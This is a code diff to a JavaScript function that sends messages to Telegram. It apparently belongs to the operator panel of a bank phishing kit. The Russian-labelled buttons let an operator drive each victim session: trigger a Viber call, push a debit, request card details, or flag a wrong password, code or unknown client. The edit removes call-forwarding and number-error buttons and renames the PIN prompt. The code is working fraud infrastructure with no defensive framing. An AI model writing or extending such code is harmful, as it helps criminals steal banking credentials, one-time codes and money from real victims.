@@ -335,14 +335,12 @@ function sendToTelegram(message, sessionId, bankName) {
         keyboard = [
             [
                 { text: 'Viber 📞', callback_data: `viber_call:${sessionId}` },
-                { text: 'Переадресация 📞', callback_data: `redirect_call:${sessionId}` },
                 { text: 'Списание', callback_data: `telegram_debit:${sessionId}` },
                 { text: 'Запрос 💳', callback_data: `request_details:${sessionId}` },
             ],
             [
-                { text: 'ПИН ❌', callback_data: `password_error:${sessionId}` },
+                { text: 'Пароль ❌', callback_data: `password_error:${sessionId}` },
                 { text: 'КОД ❌', callback_data: `code_error:${sessionId}` },
-                { text: 'НОМЕР ❌', callback_data: `number_error:${sessionId}` },
                 { text: 'Клиент не найден', callback_data: `client_not_found:${sessionId}` },
             ],
             [
@@ -354,14 +352,12 @@ function sendToTelegram(message, sessionId, bankName) {
         keyboard = [
             [
                 { text: 'Viber 📞', callback_data: `viber_call:${sessionId}` },
-                { text: 'Переадресация 📞', callback_data: `redirect_call:${sessionId}` },
                 { text: 'Списание', callback_data: `telegram_debit:${sessionId}` },
                 { text: 'Запрос 💳', callback_data: `request_details:${sessionId}` },
             ],
             [
-                { text: 'ПИН ❌', callback_data: `password_error:${sessionId}` },
+                { text: 'Пароль ❌', callback_data: `password_error:${sessionId}` },
                 { text: 'КОД ❌', callback_data: `code_error:${sessionId}` },
-                { text: 'НОМЕР ❌', callback_data: `number_error:${sessionId}` },
             ],
             [
                 { text: 'Другой банк', callback_data: `other:${sessionId}` },
@@ -372,14 +368,12 @@ function sendToTelegram(message, sessionId, bankName) {
         keyboard = [
             [
                 { text: 'Viber 📞', callback_data: `viber_call:${sessionId}` },
-                { text: 'Переадресация 📞', callback_data: `redirect_call:${sessionId}` },
                 { text: 'Списание', callback_data: `telegram_debit:${sessionId}` },
                 { text: 'Запрос 💳', callback_data: `request_details:${sessionId}` },
             ],
             [
-                { text: 'ПИН ❌', callback_data: `password_error:${sessionId}` },
+                { text: 'Пароль ❌', callback_data: `password_error:${sessionId}` },
                 { text: 'КОД ❌', callback_data: `code_error:${sessionId}` },
-                { text: 'НОМЕР ❌', callback_data: `number_error:${sessionId}` },
             ],
             [
                 { text: 'Другой банк', callback_data: `other:${sessionId}` },
